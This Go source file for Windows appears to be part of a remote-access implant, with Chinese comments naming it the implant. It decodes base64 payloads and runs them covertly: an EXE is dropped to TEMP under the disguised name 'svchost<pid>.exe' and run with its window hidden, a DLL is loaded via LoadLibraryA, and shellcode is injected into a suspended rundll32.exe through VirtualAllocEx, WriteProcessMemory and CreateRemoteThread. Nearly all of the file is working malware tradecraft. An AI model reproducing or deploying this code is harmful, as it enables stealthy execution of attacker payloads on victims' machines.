//go:build windows && !light

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

func loadEXE(data string, args string) (string, int32, string) {
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return "", -1, fmt.Sprintf("base64 decode failed: %v", err)
	}

	// 写到 %TEMP% 目录，避免权限问题
	tempDir := os.Getenv("TEMP")
	if tempDir == "" {
		tempDir = os.Getenv("TMP")
	}
	if tempDir == "" {
		tempDir = os.TempDir()
	}
	tempPath := filepath.Join(tempDir, fmt.Sprintf("svchost%d.exe", os.Getpid()))

	if err := os.WriteFile(tempPath, decoded, 0755); err != nil {
		// fallback: 写到当前 implant 所在目录
		exePath, _ := getModulePath()
		if exePath == "" {
			exePath = "."
		}
		tempPath = filepath.Join(exePath, fmt.Sprintf("svchost%d.exe", os.Getpid()))
		if err2 := os.WriteFile(tempPath, decoded, 0755); err2 != nil {
			return "", -1, fmt.Sprintf("write file failed: %v / %v", err, err2)
		}
	}

	var cmd *exec.Cmd
	if args != "" {
		cmd = exec.Command(tempPath, splitArgs(args)...)
	} else {
		cmd = exec.Command(tempPath)
	}
	// 与其他执行路径保持一致，只隐藏窗口，不创建新进程组
	// CREATE_NEW_PROCESS_GROUP 会导致某些需要控制台的 exe 无法输出
	cmd.SysProcAttr = getSysProcAttr()

	// 捕获 stdout + stderr 输出
	output, err := cmd.CombinedOutput()
	// 清理临时文件
	os.Remove(tempPath)

	if err != nil {
		outStr := string(output)
		if outStr == "" {
			outStr = "(无输出)"
		}
		return fmt.Sprintf("exit error: %v\n\nstdout:\n%s", err, outStr), int32(cmd.ProcessState.ExitCode()), ""
	}

	result := string(output)
	if result == "" {
		result = "(无输出)"
	}
	return result, 0, ""
}

func splitArgs(s string) []string {
	var args []string
	var current strings.Builder
	inQuote := false

	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c == '"':
			inQuote = !inQuote
		case c == ' ' && !inQuote:
			if current.Len() > 0 {
				args = append(args, current.String())
				current.Reset()
			}
		default:
			current.WriteByte(c)
		}
	}

	if current.Len() > 0 {
		args = append(args, current.String())
	}

	return args
}

func loadDLL(data string) (string, int32, string) {
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return "", -1, fmt.Sprintf("base64 decode failed: %v", err)
	}

	exePath, err := getModulePath()
	if err != nil {
		exePath = "."
	}
	tempPath := filepath.Join(exePath, "plugin.dll")

	if err := os.WriteFile(tempPath, decoded, 0755); err != nil {
		return "", -1, fmt.Sprintf("write file failed: %v", err)
	}
	// DLL加载后不能立即删除，因为DLL可能还在使用中

	procLoadLibraryA := resolveAPI("kernel32.dll", "LoadLibraryA")
	procGetLastError := resolveAPI("kernel32.dll", "GetLastError")

	dllName, _ := windows.BytePtrFromString(tempPath)
	hModule, _, _ := procLoadLibraryA.Call(uintptr(unsafe.Pointer(dllName)))
	if hModule == 0 {
		lastErr, _, _ := procGetLastError.Call()
		return "", -1, fmt.Sprintf("LoadLibrary failed, error code: %d", lastErr)
	}

	return fmt.Sprintf("DLL loaded at 0x%x, path: %s", hModule, tempPath), 0, ""
}

func loadShellcode(data string) (string, int32, string) {
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return "", -1, fmt.Sprintf("base64 decode failed: %v", err)
	}
	if len(decoded) == 0 {
		return "", -1, "empty shellcode"
	}

	// 注入独立宿主进程（rundll32.exe）执行，绝不使用植入端进程：
	// Go runtime 在 main 结束时调用 ExitProcess，若 shellcode 在植入端进程内
	// 执行会把植入端一起杀掉导致掉线。独立宿主被杀则无任何影响。
	return injectShellcodeHost(decoded)
}

// injectShellcodeHost 在独立宿主进程（System32\rundll32.exe）内执行 shellcode：
// CreateProcess(SUSPENDED) → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread。
func injectShellcodeHost(shellcode []byte) (string, int32, string) {
	host := filepath.Join(os.Getenv("SystemRoot"), "System32", "rundll32.exe")
	if _, err := os.Stat(host); err != nil {
		host = filepath.Join(os.Getenv("SystemRoot"), "System32", "cmd.exe")
	}

	procCreateProcessW := resolveAPI("kernel32.dll", "CreateProcessW")
	procVirtualAllocEx := resolveAPI("kernel32.dll", "VirtualAllocEx")
	procWriteProcessMemory := resolveAPI("kernel32.dll", "WriteProcessMemory")
	procVirtualProtectEx := resolveAPI("kernel32.dll", "VirtualProtectEx")
	procCreateRemoteThread := resolveAPI("kernel32.dll", "CreateRemoteThread")
	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")

	const (
		CREATE_SUSPENDED = 0x00000004
		CREATE_NO_WINDOW = 0x08000000
		MEM_COMMIT       = 0x1000
		MEM_RESERVE      = 0x2000
		PAGE_READWRITE   = 0x04
		PAGE_EXECUTE_READ = 0x20
	)

	hostW, err := windows.UTF16PtrFromString(host)
	if err != nil {
		return "", -1, fmt.Sprintf("UTF16 conversion failed: %v", err)
	}

	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation

	ret, _, _ := procCreateProcessW.Call(
		0, uintptr(unsafe.Pointer(hostW)), 0, 0, 0,
		uintptr(CREATE_SUSPENDED|CREATE_NO_WINDOW), 0, 0,
		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
	if ret == 0 {
		return "", -1, fmt.Sprintf("CreateProcessW(%s) failed (err=%d)", host, getLastError())
	}
	defer procCloseHandle.Call(uintptr(pi.Process))
	defer procCloseHandle.Call(uintptr(pi.Thread))

	// 在宿主进程中分配 RW 内存并写入 shellcode
	addr, _, _ := procVirtualAllocEx.Call(
		uintptr(pi.Process), 0, uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(PAGE_READWRITE))
	if addr == 0 {
		return "", -1, fmt.Sprintf("VirtualAllocEx failed (err=%d)", getLastError())
	}

	var written uintptr
	ret, _, _ = procWriteProcessMemory.Call(
		uintptr(pi.Process), addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)), uintptr(unsafe.Pointer(&written)))
	if ret == 0 {
		return "", -1, fmt.Sprintf("WriteProcessMemory failed (err=%d)", getLastError())
	}

	// 改为可执行
	var oldProtect uint32
	procVirtualProtectEx.Call(
		uintptr(pi.Process), addr, uintptr(len(shellcode)),
		uintptr(PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect)))

	// 在宿主进程中创建远程线程执行 shellcode
	var threadID uint32
	hThread, _, _ := procCreateRemoteThread.Call(
		uintptr(pi.Process), 0, 0, addr, 0, 0, uintptr(unsafe.Pointer(&threadID)))
	if hThread == 0 {
		return "", -1, fmt.Sprintf("CreateRemoteThread failed (err=%d)", getLastError())
	}
	procCloseHandle.Call(hThread)

	return fmt.Sprintf("shellcode injected into host process %s (pid=%d), executing independently", host, pi.ProcessId), 0, ""
}

func getModulePath() (string, error) {
	var exePath [windows.MAX_PATH]uint16
	_, err := windows.GetModuleFileName(windows.Handle(0), &exePath[0], windows.MAX_PATH)
	if err != nil {
		return "", err
	}
	return filepath.Dir(windows.UTF16PtrToString(&exePath[0])), nil
}
